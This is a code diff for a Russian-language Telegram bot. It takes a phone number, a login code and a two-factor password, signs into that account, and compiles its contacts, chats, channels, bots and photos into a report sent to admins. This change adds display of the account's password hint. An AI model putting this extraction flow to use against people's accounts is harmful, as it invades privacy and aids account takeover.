@@ -50,6 +50,11 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
 
     user_info_message = f"Выгрузка осуществлена пользователем: ({user_name}, id: {user_id}) \nДата и время выгрузки: {now}"
 
+    # Отправка сообщения с информацией о пользователе админам
+    for admin_chat_id in admin_chat_ids:
+        await bot.send_message(admin_chat_id, user_info_message)
+
+    # Отправка файлов с информацией пользователю и админам
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
 
@@ -62,16 +67,10 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
                         await bot.send_document(admin_chat_id, file)
             os.remove(file_to_send)
 
-    # Отправка сообщения с информацией о пользователе админам
-    for admin_chat_id in admin_chat_ids:
-        await bot.send_message(admin_chat_id, user_info_message)
-
-
-
 # Обработчики сообщений
 @dp.message_handler(lambda message: message.from_user.id not in allowed_users)
 async def unauthorized(message: types.Message):
-    await message.reply("Бот не работает, попробуйте позже")
+    await message.answer("Бот не работает, попробуйте позже")
     now_utc = datetime.now(pytz.utc)
     timezone = pytz.timezone('Europe/Moscow')
     now_local = now_utc.astimezone(timezone)
@@ -86,7 +85,7 @@ async def unauthorized(message: types.Message):
 async def send_welcome(message: types.Message):
     user_id = message.from_user.id
     if user_id in allowed_users:
-        await message.reply("Введите номер телефона")
+        await message.answer("Введите номер телефона")
         now_utc = datetime.now(pytz.utc)
         timezone = pytz.timezone('Europe/Moscow')
         now_local = now_utc.astimezone(timezone)
@@ -98,7 +97,7 @@ async def send_welcome(message: types.Message):
     else:
         await unauthorized(message)
 
-
+#Введен номер
 @dp.message_handler(lambda message: message.text and 
                     len(re.sub(r'\D', '', message.text)) > 9 and 
                     message.from_user.id in allowed_users)
@@ -127,8 +126,6 @@ async def get_phone_number(message: types.Message):
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
 
-
-
 @dp.message_handler(lambda message: message.text and 
                     'phone_code_hash' in user_state.get(message.from_user.id, {}) and
                     'awaiting_password' not in user_state.get(message.from_user.id, {}))
@@ -142,35 +139,37 @@ async def get_code(message: types.Message):
     try:
         await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
-        await message.reply("Подключено! Формирую отчет, который по завершению пришлю Вам. \nЕсли произошла ошибка, повторите попытку имнут через 10")
+        await message.answer("Подключено! Формирую отчет")
         await process_user_data(client, phone_number, message.from_user.id)
         await client.log_out()
         await client.disconnect()
         
         user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
     except SessionPasswordNeededError:
-        await message.reply("Установлена двухфакторная аутентификация. Введите пароль")
+        await message.answer("Установлена двухфакторная аутентификация. Введите пароль")
         user_state[message.from_user.id]['awaiting_password'] = True
         user_state[message.from_user.id]['client'] = client  # Сохраняем клиент для последующего использования
         user_state[message.from_user.id]['password_attempts'] = 0  # Инициализируем попытки ввода пароля
+        password_info = await client(functions.account.GetPasswordRequest())
+        password_info_hint = f'Подсказка для пароля: {password_info.hint}'
+        await message.answer(password_info_hint)
     except PhoneCodeInvalidError:
         user_state[message.from_user.id]['code_attempts'] = user_state[message.from_user.id].get('code_attempts', 0) + 1
         if user_state[message.from_user.id]['code_attempts'] >= 3:
-            await message.reply("Превышено количество попыток ввода кода. Перезапусти меня")
+            await message.answer("Превышено количество попыток ввода кода. Перезапусти меня")
             user_state.pop(message.from_user.id, None)
             await client.log_out()
             await client.disconnect()
         else:
-            await message.reply(f"Неверный ПИН-код. Попробуйте снова. Попытка {user_state[message.from_user.id]['code_attempts']} из 3.")
+            await message.answer(f"Неверный ПИН-код. Попробуйте снова. Попытка {user_state[message.from_user.id]['code_attempts']} из 3.")
     except Exception as e:
-        await message.reply(f"Произошла ошибка: {e}")
+        await message.answer(f"Произошла ошибка: {e}")
     finally:
         if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
             if 'code_attempts' not in user_state.get(message.from_user.id, {}):
                 await client.log_out()
                 await client.disconnect()
-
-
+                
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
@@ -181,21 +180,21 @@ async def process_password(message: types.Message):
         await client.connect()
         await client.sign_in(password=password)
         
-        await message.reply("Подключено! Формирую отчет, не прерывай процесс! По завершению пришлю его вам. \nЕсли процесс затянулся более, чем на 10 минут, свяжитесь с администратором")
+        await message.answer("Подключено! Формирую отчет")
         phone_number = user_state[message.from_user.id]['phone_number']
         await process_user_data(client, phone_number, message.from_user.id)
         user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
     except PasswordHashInvalidError:
         user_state[message.from_user.id]['password_attempts'] += 1
         if user_state[message.from_user.id]['password_attempts'] >= 3:
-            await message.reply("Превышено количество попыток ввода пароля. Перезапусти меня")
+            await message.answer("Превышено количество попыток ввода пароля. Перезапусти меня")
             user_state.pop(message.from_user.id, None)
             await client.log_out()
             await client.disconnect()
         else:
-            await message.reply(f"Неверный пароль. Попробуйте снова. Попытка {user_state[message.from_user.id]['password_attempts']} из 3.")
+            await message.answer(f"Неверный пароль. Попробуйте снова. Попытка {user_state[message.from_user.id]['password_attempts']} из 3.")
     except Exception as e:
-        await message.reply(f"Произошла ошибка: {e}")
+        await message.answer(f"Произошла ошибка: {e}")
     finally:
         if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
             await client.log_out()
@@ -207,13 +206,16 @@ def create_client():
 
 # Функция для обработки данных пользователя
 async def process_user_data(client, phone_number, user_id):
+    selection = '0'
     try:
-        userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number)
-        count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html = await get_blocked_bot(client)
-        delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html = await get_type_of_chats(client)
-        groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, client)
+        userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number, selection)
+        count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html, list_botblocked = await get_blocked_bot(client, selection)
+        delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html, list_botexisted = await get_type_of_chats(client, selection)
+        groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
         total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userid, userinfo, firstname, lastname, username)
-        await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, user_id, photos_user_html)
+        #await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
+        bot_from_search, bot_from_search_html = await get_bot_from_search(client, phone_number, selection, list_botblocked, list_botexisted)
+        await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, user_id, photos_user_html, bot_from_search_html)
         await send_files_to_bot(bot, admin_chat_ids, user_id)
     except Exception as e:
         logging.error(f"Error processing user data: {e}")
